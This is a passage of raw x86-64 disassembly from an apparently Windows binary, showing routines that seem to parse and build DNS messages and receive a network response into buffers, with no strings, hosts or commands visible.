   11f92:	85 c0                	test   %eax,%eax
   11f94:	0f 84 62 01 00 00    	je     0x120fc
   11f9a:	3b c7                	cmp    %edi,%eax
   11f9c:	0f 8f 5a 01 00 00    	jg     0x120fc
   11fa2:	0f b7 84 24 54 01 00 	movzwl 0x154(%rsp),%eax
   11fa9:	00 
   11faa:	48 8d 9c 24 5c 01 00 	lea    0x15c(%rsp),%rbx
   11fb1:	00 
   11fb2:	66 c1 c0 08          	rol    $0x8,%ax
   11fb6:	0f b7 c8             	movzwl %ax,%ecx
   11fb9:	0f b7 84 24 56 01 00 	movzwl 0x156(%rsp),%eax
   11fc0:	00 
   11fc1:	66 c1 c0 08          	rol    $0x8,%ax
   11fc5:	44 0f b7 c0          	movzwl %ax,%r8d
   11fc9:	83 f9 01             	cmp    $0x1,%ecx
   11fcc:	74 07                	je     0x11fd5
   11fce:	b0 01                	mov    $0x1,%al
   11fd0:	e9 29 01 00 00       	jmp    0x120fe
   11fd5:	85 c9                	test   %ecx,%ecx
   11fd7:	7e 14                	jle    0x11fed
   11fd9:	0f b6 13             	movzbl (%rbx),%edx
   11fdc:	8d 42 01             	lea    0x1(%rdx),%eax
   11fdf:	48 63 c8             	movslq %eax,%rcx
   11fe2:	48 03 d9             	add    %rcx,%rbx
   11fe5:	85 d2                	test   %edx,%edx
   11fe7:	75 f0                	jne    0x11fd9
   11fe9:	48 83 c3 04          	add    $0x4,%rbx
   11fed:	45 85 c0             	test   %r8d,%r8d
   11ff0:	7e dc                	jle    0x11fce
   11ff2:	49 8b f0             	mov    %r8,%rsi
   11ff5:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   11ffc:	00 
   11ffd:	33 d2                	xor    %edx,%edx
   11fff:	41 b8 80 00 00 00    	mov    $0x80,%r8d
   12005:	e8 36 22 00 00       	call   0x14240
   1200a:	83 64 24 34 00       	andl   $0x0,0x34(%rsp)
   1200f:	4c 8d 4c 24 34       	lea    0x34(%rsp),%r9
   12014:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
   1201b:	00 
   1201c:	48 8d 8c 24 50 01 00 	lea    0x150(%rsp),%rcx
   12023:	00 
   12024:	48 8b d3             	mov    %rbx,%rdx
   12027:	e8 00 01 00 00       	call   0x1212c
   1202c:	0f b7 43 02          	movzwl 0x2(%rbx),%eax
   12030:	48 83 c3 0c          	add    $0xc,%rbx
   12034:	66 c1 c0 08          	rol    $0x8,%ax
   12038:	0f b7 e8             	movzwl %ax,%ebp
   1203b:	0f b7 43 fe          	movzwl -0x2(%rbx),%eax
   1203f:	66 c1 c0 08          	rol    $0x8,%ax
   12043:	0f b7 f8             	movzwl %ax,%edi
   12046:	83 fd 05             	cmp    $0x5,%ebp
   12049:	75 35                	jne    0x12080
   1204b:	44 8d 45 7b          	lea    0x7b(%rbp),%r8d
   1204f:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   12054:	33 d2                	xor    %edx,%edx
   12056:	e8 e5 21 00 00       	call   0x14240
   1205b:	83 64 24 34 00       	andl   $0x0,0x34(%rsp)
   12060:	4c 8d 4c 24 34       	lea    0x34(%rsp),%r9
   12065:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1206a:	48 8d 8c 24 50 01 00 	lea    0x150(%rsp),%rcx
   12071:	00 
   12072:	48 8b d3             	mov    %rbx,%rdx
   12075:	e8 b2 00 00 00       	call   0x1212c
   1207a:	4c 63 df             	movslq %edi,%r11
   1207d:	49 03 db             	add    %r11,%rbx
   12080:	83 fd 01             	cmp    $0x1,%ebp
   12083:	75 68                	jne    0x120ed
   12085:	83 ff 04             	cmp    $0x4,%edi
   12088:	75 5d                	jne    0x120e7
   1208a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1208f:	4c 63 c7             	movslq %edi,%r8
   12092:	48 8b d3             	mov    %rbx,%rdx
   12095:	e8 a6 22 00 00       	call   0x14340
   1209a:	44 0f b6 5c 24 33    	movzbl 0x33(%rsp),%r11d
   120a0:	0f b6 44 24 32       	movzbl 0x32(%rsp),%eax
   120a5:	44 0f b6 4c 24 31    	movzbl 0x31(%rsp),%r9d
   120ab:	44 0f b6 44 24 30    	movzbl 0x30(%rsp),%r8d
   120b1:	44 89 5c 24 28       	mov    %r11d,0x28(%rsp)
   120b6:	48 8d 15 73 2a 00 00 	lea    0x2a73(%rip),%rdx        # 0x14b30
   120bd:	48 8d 0d ac 51 00 00 	lea    0x51ac(%rip),%rcx        # 0x17270
   120c4:	89 44 24 20          	mov    %eax,0x20(%rsp)
   120c8:	ff 15 82 2f 00 00    	call   *0x2f82(%rip)        # 0x15050
   120ce:	4c 8d 0d 9b 51 00 00 	lea    0x519b(%rip),%r9        # 0x17270
   120d5:	4c 8d 05 34 27 00 00 	lea    0x2734(%rip),%r8        # 0x14810
   120dc:	8d 55 17             	lea    0x17(%rbp),%edx
   120df:	49 8b cc             	mov    %r12,%rcx
   120e2:	e8 7d f1 ff ff       	call   0x11264
   120e7:	48 8b c7             	mov    %rdi,%rax
   120ea:	48 03 df             	add    %rdi,%rbx
   120ed:	48 83 ee 01          	sub    $0x1,%rsi
   120f1:	0f 85 fe fe ff ff    	jne    0x11ff5
   120f7:	e9 d2 fe ff ff       	jmp    0x11fce
   120fc:	32 c0                	xor    %al,%al
   120fe:	48 8b 8c 24 50 09 00 	mov    0x950(%rsp),%rcx
   12105:	00 
   12106:	48 33 cc             	xor    %rsp,%rcx
   12109:	e8 b2 20 00 00       	call   0x141c0
   1210e:	4c 8d 9c 24 60 09 00 	lea    0x960(%rsp),%r11
   12115:	00 
   12116:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1211a:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1211e:	49 8b e3             	mov    %r11,%rsp
   12121:	41 5c                	pop    %r12
   12123:	5f                   	pop    %rdi
   12124:	5e                   	pop    %rsi
   12125:	c3                   	ret
   12126:	cc                   	int3
   12127:	cc                   	int3
   12128:	cc                   	int3
   12129:	cc                   	int3
   1212a:	cc                   	int3
   1212b:	cc                   	int3
   1212c:	48 8b c4             	mov    %rsp,%rax
   1212f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   12133:	48 89 68 10          	mov    %rbp,0x10(%rax)
   12137:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1213b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1213f:	41 54                	push   %r12
   12141:	41 55                	push   %r13
   12143:	41 56                	push   %r14
   12145:	48 83 ec 20          	sub    $0x20,%rsp
   12149:	49 8b e9             	mov    %r9,%rbp
   1214c:	4d 8b e8             	mov    %r8,%r13
   1214f:	48 8b f2             	mov    %rdx,%rsi
   12152:	4c 8b f1             	mov    %rcx,%r14
   12155:	48 63 7d 00          	movslq 0x0(%rbp),%rdi
   12159:	49 03 fd             	add    %r13,%rdi
   1215c:	44 0f b6 26          	movzbl (%rsi),%r12d
   12160:	45 85 e4             	test   %r12d,%r12d
   12163:	74 40                	je     0x121a5
   12165:	41 8b c4             	mov    %r12d,%eax
   12168:	25 c0 00 00 00       	and    $0xc0,%eax
   1216d:	3c c0                	cmp    $0xc0,%al
   1216f:	74 2b                	je     0x1219c
   12171:	48 ff c6             	inc    %rsi
   12174:	4d 8b c4             	mov    %r12,%r8
   12177:	48 8b cf             	mov    %rdi,%rcx
   1217a:	48 8b d6             	mov    %rsi,%rdx
   1217d:	e8 be 21 00 00       	call   0x14340
   12182:	44 01 65 00          	add    %r12d,0x0(%rbp)
   12186:	49 03 f4             	add    %r12,%rsi
   12189:	49 03 fc             	add    %r12,%rdi
   1218c:	80 3e 00             	cmpb   $0x0,(%rsi)
   1218f:	74 cb                	je     0x1215c
   12191:	c6 07 2e             	movb   $0x2e,(%rdi)
   12194:	48 ff c7             	inc    %rdi
   12197:	ff 45 00             	incl   0x0(%rbp)
   1219a:	eb c0                	jmp    0x1215c
   1219c:	0f b6 76 01          	movzbl 0x1(%rsi),%esi
   121a0:	49 03 f6             	add    %r14,%rsi
   121a3:	eb b0                	jmp    0x12155
   121a5:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   121aa:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   121af:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   121b4:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   121b9:	48 83 c4 20          	add    $0x20,%rsp
   121bd:	41 5e                	pop    %r14
   121bf:	41 5d                	pop    %r13
   121c1:	41 5c                	pop    %r12
   121c3:	c3                   	ret
   121c4:	cc                   	int3
   121c5:	cc                   	int3
   121c6:	cc                   	int3
   121c7:	cc                   	int3
   121c8:	cc                   	int3
   121c9:	cc                   	int3
   121ca:	cc                   	int3
   121cb:	cc                   	int3
   121cc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   121d1:	55                   	push   %rbp
   121d2:	56                   	push   %rsi
   121d3:	57                   	push   %rdi
   121d4:	41 54                	push   %r12
   121d6:	41 55                	push   %r13
   121d8:	41 56                	push   %r14
   121da:	41 57                	push   %r15
   121dc:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   121e3:	48 8b 05 16 3f 00 00 	mov    0x3f16(%rip),%rax        # 0x16100
   121ea:	48 33 c4             	xor    %rsp,%rax
   121ed:	48 89 84 24 40 04 00 	mov    %rax,0x440(%rsp)
   121f4:	00 
   121f5:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   121fa:	49 8b d8             	mov    %r8,%rbx
   121fd:	4c 8b ea             	mov    %rdx,%r13
   12200:	bf ff 01 00 00       	mov    $0x1ff,%edi
   12205:	48 8d 4c 24 41       	lea    0x41(%rsp),%rcx
   1220a:	45 33 ff             	xor    %r15d,%r15d
   1220d:	4c 8b c7             	mov    %rdi,%r8
   12210:	33 d2                	xor    %edx,%edx
   12212:	44 88 7c 24 40       	mov    %r15b,0x40(%rsp)
   12217:	e8 24 20 00 00       	call   0x14240
   1221c:	48 8d 8c 24 41 02 00 	lea    0x241(%rsp),%rcx
   12223:	00 
   12224:	4c 8b c7             	mov    %rdi,%r8
   12227:	33 d2                	xor    %edx,%edx
   12229:	44 88 bc 24 40 02 00 	mov    %r15b,0x240(%rsp)
   12230:	00 
   12231:	e8 0a 20 00 00       	call   0x14240
   12236:	45 8b e7             	mov    %r15d,%r12d
   12239:	48 8d ac 24 40 02 00 	lea    0x240(%rsp),%rbp
   12240:	00 
   12241:	45 8d 77 01          	lea    0x1(%r15),%r14d
   12245:	48 8d 15 b4 27 00 00 	lea    0x27b4(%rip),%rdx        # 0x14a00
   1224c:	48 8b cb             	mov    %rbx,%rcx
   1224f:	ff 15 13 2e 00 00    	call   *0x2e13(%rip)        # 0x15068
   12255:	49 3b c7             	cmp    %r15,%rax
   12258:	74 26                	je     0x12280
   1225a:	48 8d 15 9f 27 00 00 	lea    0x279f(%rip),%rdx        # 0x14a00
   12261:	48 8b cb             	mov    %rbx,%rcx
   12264:	ff 15 fe 2d 00 00    	call   *0x2dfe(%rip)        # 0x15068
   1226a:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1226e:	48 8b f8             	mov    %rax,%rdi
   12271:	33 c0                	xor    %eax,%eax
   12273:	f2 ae                	repnz scas (%rdi),%al
   12275:	48 f7 d1             	not    %rcx
   12278:	49 2b ce             	sub    %r14,%rcx
   1227b:	48 8b d1             	mov    %rcx,%rdx
   1227e:	eb 03                	jmp    0x12283
   12280:	49 8b d7             	mov    %r15,%rdx
   12283:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   12287:	33 c0                	xor    %eax,%eax
   12289:	48 8b fb             	mov    %rbx,%rdi
   1228c:	f2 ae                	repnz scas (%rdi),%al
   1228e:	48 f7 d1             	not    %rcx
   12291:	49 2b ce             	sub    %r14,%rcx
   12294:	48 8b f1             	mov    %rcx,%rsi
   12297:	2b f2                	sub    %edx,%esi
   12299:	48 8b d3             	mov    %rbx,%rdx
   1229c:	40 88 75 00          	mov    %sil,0x0(%rbp)
   122a0:	49 03 ee             	add    %r14,%rbp
   122a3:	48 63 fe             	movslq %esi,%rdi
   122a6:	48 8b cd             	mov    %rbp,%rcx
   122a9:	4c 8b c7             	mov    %rdi,%r8
   122ac:	e8 8f 20 00 00       	call   0x14340
   122b1:	48 8d 15 48 27 00 00 	lea    0x2748(%rip),%rdx        # 0x14a00
   122b8:	48 8b cb             	mov    %rbx,%rcx
   122bb:	45 8d 64 34 01       	lea    0x1(%r12,%rsi,1),%r12d
   122c0:	48 03 ef             	add    %rdi,%rbp
   122c3:	ff 15 9f 2d 00 00    	call   *0x2d9f(%rip)        # 0x15068
   122c9:	49 3b c7             	cmp    %r15,%rax
   122cc:	74 0e                	je     0x122dc
   122ce:	8d 46 01             	lea    0x1(%rsi),%eax
   122d1:	48 63 c8             	movslq %eax,%rcx
   122d4:	48 03 d9             	add    %rcx,%rbx
   122d7:	e9 69 ff ff ff       	jmp    0x12245
   122dc:	44 88 7d 00          	mov    %r15b,0x0(%rbp)
   122e0:	b9 00 01 00 00       	mov    $0x100,%ecx
   122e5:	41 83 c4 05          	add    $0x5,%r12d
   122e9:	66 42 89 4c 35 00    	mov    %cx,0x0(%rbp,%r14,1)
   122ef:	66 42 89 4c 35 02    	mov    %cx,0x2(%rbp,%r14,1)
   122f5:	8d 41 ff             	lea    -0x1(%rcx),%eax
   122f8:	66 89 4c 24 44       	mov    %cx,0x44(%rsp)
   122fd:	48 8d 94 24 40 02 00 	lea    0x240(%rsp),%rdx
   12304:	00 
   12305:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   1230a:	4d 63 c4             	movslq %r12d,%r8
   1230d:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   12312:	66 44 89 74 24 42    	mov    %r14w,0x42(%rsp)
   12318:	66 44 89 7c 24 46    	mov    %r15w,0x46(%rsp)
   1231e:	66 44 89 7c 24 48    	mov    %r15w,0x48(%rsp)
   12324:	66 44 89 7c 24 4a    	mov    %r15w,0x4a(%rsp)
   1232a:	e8 11 20 00 00       	call   0x14340
   1232f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   12334:	45 8d 44 24 0c       	lea    0xc(%r12),%r8d
   12339:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1233e:	45 33 c9             	xor    %r9d,%r9d
   12341:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   12348:	00 
   12349:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1234e:	e8 41 0a 00 00       	call   0x12d94
   12353:	48 8b 8c 24 40 04 00 	mov    0x440(%rsp),%rcx
   1235a:	00 
   1235b:	48 33 cc             	xor    %rsp,%rcx
   1235e:	e8 5d 1e 00 00       	call   0x141c0
   12363:	48 8b 9c 24 98 04 00 	mov    0x498(%rsp),%rbx
   1236a:	00 
   1236b:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   12372:	41 5f                	pop    %r15
   12374:	41 5e                	pop    %r14
   12376:	41 5d                	pop    %r13
   12378:	41 5c                	pop    %r12
   1237a:	5f                   	pop    %rdi
   1237b:	5e                   	pop    %rsi
   1237c:	5d                   	pop    %rbp
   1237d:	c3                   	ret
   1237e:	cc                   	int3
   1237f:	cc                   	int3
   12380:	cc                   	int3
   12381:	cc                   	int3
   12382:	cc                   	int3
   12383:	cc                   	int3
   12384:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   12389:	55                   	push   %rbp
   1238a:	56                   	push   %rsi
   1238b:	57                   	push   %rdi
   1238c:	41 54                	push   %r12
   1238e:	41 55                	push   %r13
   12390:	41 56                	push   %r14
   12392:	41 57                	push   %r15
   12394:	48 83 ec 60          	sub    $0x60,%rsp
   12398:	48 8b 05 61 3d 00 00 	mov    0x3d61(%rip),%rax        # 0x16100
   1239f:	48 33 c4             	xor    %rsp,%rax
   123a2:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   123a7:	48 8b 84 24 c0 00 00 	mov    0xc0(%rsp),%rax
   123ae:	00 
   123af:	4c 8b a4 24 c8 00 00 	mov    0xc8(%rsp),%r12
   123b6:	00 
   123b7:	48 8b ac 24 d0 00 00 	mov    0xd0(%rsp),%rbp
   123be:	00 
   123bf:	48 8b da             	mov    %rdx,%rbx
   123c2:	48 8b f9             	mov    %rcx,%rdi
   123c5:	ba 01 00 08 00       	mov    $0x80001,%edx
   123ca:	b9 01 00 00 00       	mov    $0x1,%ecx
   123cf:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   123d4:	45 0f b7 e9          	movzwl %r9w,%r13d
   123d8:	4d 8b f8             	mov    %r8,%r15
   123db:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   123e0:	ff 15 42 2c 00 00    	call   *0x2c42(%rip)        # 0x15028
   123e6:	48 8b f0             	mov    %rax,%rsi
   123e9:	48 8b cd             	mov    %rbp,%rcx
   123ec:	48 85 c0             	test   %rax,%rax
   123ef:	0f 84 84 04 00 00    	je     0x12879
   123f5:	4c 8d 05 24 26 00 00 	lea    0x2624(%rip),%r8        # 0x14a20
   123fc:	4c 8b cb             	mov    %rbx,%r9
   123ff:	ba 00 10 00 00       	mov    $0x1000,%edx
   12404:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   12409:	e8 56 ee ff ff       	call   0x11264
   1240e:	bf 38 00 00 00       	mov    $0x38,%edi
   12413:	48 8b d7             	mov    %rdi,%rdx
   12416:	33 c9                	xor    %ecx,%ecx
   12418:	ff 15 0a 2c 00 00    	call   *0x2c0a(%rip)        # 0x15028
   1241e:	48 8b d8             	mov    %rax,%rbx
   12421:	48 85 c0             	test   %rax,%rax
   12424:	0f 84 41 04 00 00    	je     0x1286b
   1242a:	4c 8b c7             	mov    %rdi,%r8
   1242d:	33 d2                	xor    %edx,%edx
   1242f:	48 8b c8             	mov    %rax,%rcx
   12432:	e8 09 1e 00 00       	call   0x14240
   12437:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1243b:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   12441:	48 89 7b 10          	mov    %rdi,0x10(%rbx)
   12445:	48 f7 db             	neg    %rbx
   12448:	48 3b df             	cmp    %rdi,%rbx
   1244b:	0f 84 1a 04 00 00    	je     0x1286b
   12451:	8d 47 03             	lea    0x3(%rdi),%eax
   12454:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   12459:	66 41 c1 c5 08       	rol    $0x8,%r13w
   1245e:	49 8b cf             	mov    %r15,%rcx
   12461:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   12466:	66 44 89 6c 24 42    	mov    %r13w,0x42(%rsp)
   1246c:	e8 db 09 00 00       	call   0x12e4c
   12471:	41 83 ce ff          	or     $0xffffffff,%r14d
   12475:	44 8d 47 11          	lea    0x11(%rdi),%r8d
   12479:	41 8b ce             	mov    %r14d,%ecx
   1247c:	85 c0                	test   %eax,%eax
   1247e:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   12483:	0f 45 4c 24 34       	cmovne 0x34(%rsp),%ecx
   12488:	89 4c 24 44          	mov    %ecx,0x44(%rsp)
   1248c:	48 8b cb             	mov    %rbx,%rcx
   1248f:	e8 bc 05 00 00       	call   0x12a50
   12494:	85 c0                	test   %eax,%eax
   12496:	79 2b                	jns    0x124c3
   12498:	41 c7 04 24 01 00 00 	movl   $0x1,(%r12)
   1249f:	00 
   124a0:	33 d2                	xor    %edx,%edx
   124a2:	48 8b cd             	mov    %rbp,%rcx
   124a5:	ff 15 b5 2b 00 00    	call   *0x2bb5(%rip)        # 0x15060
   124ab:	48 8b ce             	mov    %rsi,%rcx
   124ae:	33 d2                	xor    %edx,%edx
   124b0:	ff 15 aa 2b 00 00    	call   *0x2baa(%rip)        # 0x15060
   124b6:	48 8b cb             	mov    %rbx,%rcx
   124b9:	e8 d6 04 00 00       	call   0x12994
   124be:	e9 be 03 00 00       	jmp    0x12881
   124c3:	48 8b cf             	mov    %rdi,%rcx
   124c6:	33 c0                	xor    %eax,%eax
   124c8:	48 8b fd             	mov    %rbp,%rdi
   124cb:	f2 ae                	repnz scas (%rdi),%al
   124cd:	45 33 c9             	xor    %r9d,%r9d
   124d0:	48 8b d5             	mov    %rbp,%rdx
   124d3:	48 f7 d1             	not    %rcx
   124d6:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
   124da:	48 8b cb             	mov    %rbx,%rcx
   124dd:	e8 4a 08 00 00       	call   0x12d2c
   124e2:	85 c0                	test   %eax,%eax
   124e4:	0f 8f be 00 00 00    	jg     0x125a8
   124ea:	48 8b cb             	mov    %rbx,%rcx
   124ed:	e8 a2 04 00 00       	call   0x12994
   124f2:	bf 38 00 00 00       	mov    $0x38,%edi
   124f7:	33 c9                	xor    %ecx,%ecx
   124f9:	48 8b d7             	mov    %rdi,%rdx
   124fc:	ff 15 26 2b 00 00    	call   *0x2b26(%rip)        # 0x15028
   12502:	48 8b d8             	mov    %rax,%rbx
   12505:	48 85 c0             	test   %rax,%rax
   12508:	0f 84 5d 03 00 00    	je     0x1286b
   1250e:	4c 8b c7             	mov    %rdi,%r8
   12511:	33 d2                	xor    %edx,%edx
   12513:	48 8b c8             	mov    %rax,%rcx
   12516:	e8 25 1d 00 00       	call   0x14240
   1251b:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   1251f:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   12525:	48 89 7b 10          	mov    %rdi,0x10(%rbx)
   12529:	48 f7 db             	neg    %rbx
   1252c:	48 3b df             	cmp    %rdi,%rbx
   1252f:	0f 84 36 03 00 00    	je     0x1286b
   12535:	8d 47 03             	lea    0x3(%rdi),%eax
   12538:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   1253d:	49 8b cf             	mov    %r15,%rcx
   12540:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   12545:	66 44 89 6c 24 42    	mov    %r13w,0x42(%rsp)
   1254b:	e8 fc 08 00 00       	call   0x12e4c
   12550:	41 8b ce             	mov    %r14d,%ecx
   12553:	85 c0                	test   %eax,%eax
   12555:	44 8d 47 11          	lea    0x11(%rdi),%r8d
   12559:	0f 45 4c 24 34       	cmovne 0x34(%rsp),%ecx
   1255e:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   12563:	89 4c 24 44          	mov    %ecx,0x44(%rsp)
   12567:	48 8b cb             	mov    %rbx,%rcx
   1256a:	e8 e1 04 00 00       	call   0x12a50
   1256f:	85 c0                	test   %eax,%eax
   12571:	0f 88 21 ff ff ff    	js     0x12498
   12577:	48 8b cf             	mov    %rdi,%rcx
   1257a:	33 c0                	xor    %eax,%eax
   1257c:	48 8b fd             	mov    %rbp,%rdi
   1257f:	f2 ae                	repnz scas (%rdi),%al
   12581:	45 33 c9             	xor    %r9d,%r9d
   12584:	48 8b d5             	mov    %rbp,%rdx
   12587:	48 f7 d1             	not    %rcx
   1258a:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
   1258e:	48 8b cb             	mov    %rbx,%rcx
   12591:	e8 96 07 00 00       	call   0x12d2c
   12596:	85 c0                	test   %eax,%eax
   12598:	79 0e                	jns    0x125a8
   1259a:	b8 02 00 00 00       	mov    $0x2,%eax
   1259f:	41 89 04 24          	mov    %eax,(%r12)
   125a3:	e9 f8 fe ff ff       	jmp    0x124a0
   125a8:	45 33 c9             	xor    %r9d,%r9d
   125ab:	41 b8 00 00 08 00    	mov    $0x80000,%r8d
   125b1:	48 8b d6             	mov    %rsi,%rdx
   125b4:	48 8b cb             	mov    %rbx,%rcx
   125b7:	e8 8c 06 00 00       	call   0x12c48
   125bc:	8b f8                	mov    %eax,%edi
   125be:	85 c0                	test   %eax,%eax
   125c0:	0f 8f da 00 00 00    	jg     0x126a0
   125c6:	48 8b cb             	mov    %rbx,%rcx
   125c9:	e8 c6 03 00 00       	call   0x12994
   125ce:	bf 38 00 00 00       	mov    $0x38,%edi
   125d3:	33 c9                	xor    %ecx,%ecx
   125d5:	48 8b d7             	mov    %rdi,%rdx
   125d8:	ff 15 4a 2a 00 00    	call   *0x2a4a(%rip)        # 0x15028
   125de:	48 8b d8             	mov    %rax,%rbx
   125e1:	48 85 c0             	test   %rax,%rax
   125e4:	0f 84 81 02 00 00    	je     0x1286b
   125ea:	4c 8b c7             	mov    %rdi,%r8
   125ed:	33 d2                	xor    %edx,%edx
   125ef:	48 8b c8             	mov    %rax,%rcx
   125f2:	e8 49 1c 00 00       	call   0x14240
   125f7:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   125fb:	c7 03 01 00 00 00    	movl   $0x1,(%rbx)
   12601:	48 89 7b 10          	mov    %rdi,0x10(%rbx)
   12605:	48 f7 db             	neg    %rbx
   12608:	48 3b df             	cmp    %rdi,%rbx
   1260b:	0f 84 5a 02 00 00    	je     0x1286b
   12611:	8d 47 03             	lea    0x3(%rdi),%eax
   12614:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   12619:	49 8b cf             	mov    %r15,%rcx
   1261c:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   12621:	66 44 89 6c 24 42    	mov    %r13w,0x42(%rsp)
   12627:	e8 20 08 00 00       	call   0x12e4c
   1262c:	85 c0                	test   %eax,%eax
   1262e:	44 8d 47 11          	lea    0x11(%rdi),%r8d
   12632:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   12637:	44 0f 45 74 24 34    	cmovne 0x34(%rsp),%r14d
   1263d:	48 8b cb             	mov    %rbx,%rcx
   12640:	44 89 74 24 44       	mov    %r14d,0x44(%rsp)
   12645:	e8 06 04 00 00       	call   0x12a50
   1264a:	85 c0                	test   %eax,%eax
   1264c:	0f 88 46 fe ff ff    	js     0x12498
   12652:	48 8b cf             	mov    %rdi,%rcx
   12655:	33 c0                	xor    %eax,%eax
   12657:	48 8b fd             	mov    %rbp,%rdi
   1265a:	f2 ae                	repnz scas (%rdi),%al
   1265c:	45 33 c9             	xor    %r9d,%r9d
   1265f:	48 8b d5             	mov    %rbp,%rdx
   12662:	48 f7 d1             	not    %rcx
   12665:	4c 8d 41 ff          	lea    -0x1(%rcx),%r8
   12669:	48 8b cb             	mov    %rbx,%rcx
   1266c:	e8 bb 06 00 00       	call   0x12d2c
   12671:	85 c0                	test   %eax,%eax
   12673:	0f 88 21 ff ff ff    	js     0x1259a
   12679:	45 33 c9             	xor    %r9d,%r9d
   1267c:	41 b8 00 00 08 00    	mov    $0x80000,%r8d
   12682:	48 8b d6             	mov    %rsi,%rdx
   12685:	48 8b cb             	mov    %rbx,%rcx
   12688:	e8 bb 05 00 00       	call   0x12c48
   1268d:	8b f8                	mov    %eax,%edi
   1268f:	85 c0                	test   %eax,%eax
   12691:	79 0d                	jns    0x126a0
   12693:	41 c7 04 24 03 00 00 	movl   $0x3,(%r12)
   1269a:	00 
   1269b:	e9 00 fe ff ff       	jmp    0x124a0
   126a0:	4c 8d b6 00 00 08 00 	lea    0x80000(%rsi),%r14
   126a7:	48 8d 15 12 24 00 00 	lea    0x2412(%rip),%rdx        # 0x14ac0
   126ae:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   126b4:	48 8b ce             	mov    %rsi,%rcx
   126b7:	41 c6 06 00          	movb   $0x0,(%r14)
   126bb:	ff 15 97 29 00 00    	call   *0x2997(%rip)        # 0x15058
   126c1:	85 c0                	test   %eax,%eax
   126c3:	0f 85 d7 fd ff ff    	jne    0x124a0
   126c9:	48 8d 15 00 24 00 00 	lea    0x2400(%rip),%rdx        # 0x14ad0
   126d0:	48 8b ce             	mov    %rsi,%rcx
   126d3:	ff 15 8f 29 00 00    	call   *0x298f(%rip)        # 0x15068
   126d9:	48 85 c0             	test   %rax,%rax
   126dc:	74 1f                	je     0x126fd
   126de:	48 8d 48 10          	lea    0x10(%rax),%rcx
   126e2:	49 3b ce             	cmp    %r14,%rcx
   126e5:	0f 83 b5 fd ff ff    	jae    0x124a0
   126eb:	ff 15 f7 29 00 00    	call   *0x29f7(%rip)        # 0x150e8
   126f1:	44 8b e8             	mov    %eax,%r13d
   126f4:	85 c0                	test   %eax,%eax
   126f6:	75 10                	jne    0x12708
   126f8:	e9 a3 fd ff ff       	jmp    0x124a0
   126fd:	41 bd 00 00 20 00    	mov    $0x200000,%r13d
   12703:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   12708:	41 8b d5             	mov    %r13d,%edx
   1270b:	b9 01 00 00 00       	mov    $0x1,%ecx
   12710:	45 8b fd             	mov    %r13d,%r15d
   12713:	ff 15 0f 29 00 00    	call   *0x290f(%rip)        # 0x15028
   12719:	33 d2                	xor    %edx,%edx
   1271b:	4c 8b e0             	mov    %rax,%r12
   1271e:	48 85 c0             	test   %rax,%rax
   12721:	0f 84 7b fd ff ff    	je     0x124a2
   12727:	4d 8b c7             	mov    %r15,%r8
   1272a:	48 8b c8             	mov    %rax,%rcx
   1272d:	e8 0e 1b 00 00       	call   0x14240
   12732:	48 8d 15 a7 23 00 00 	lea    0x23a7(%rip),%rdx        # 0x14ae0
   12739:	48 8b ce             	mov    %rsi,%rcx
   1273c:	ff 15 26 29 00 00    	call   *0x2926(%rip)        # 0x15068
   12742:	41 bf 00 00 08 00    	mov    $0x80000,%r15d
   12748:	eb 39                	jmp    0x12783
   1274a:	45 8b c7             	mov    %r15d,%r8d
   1274d:	8b d7                	mov    %edi,%edx
   1274f:	45 33 c9             	xor    %r9d,%r9d
   12752:	44 2b c7             	sub    %edi,%r8d
   12755:	48 03 d6             	add    %rsi,%rdx
   12758:	48 8b cb             	mov    %rbx,%rcx
   1275b:	e8 e8 04 00 00       	call   0x12c48
   12760:	03 f8                	add    %eax,%edi
   12762:	85 c0                	test   %eax,%eax
   12764:	0f 8e 96 00 00 00    	jle    0x12800
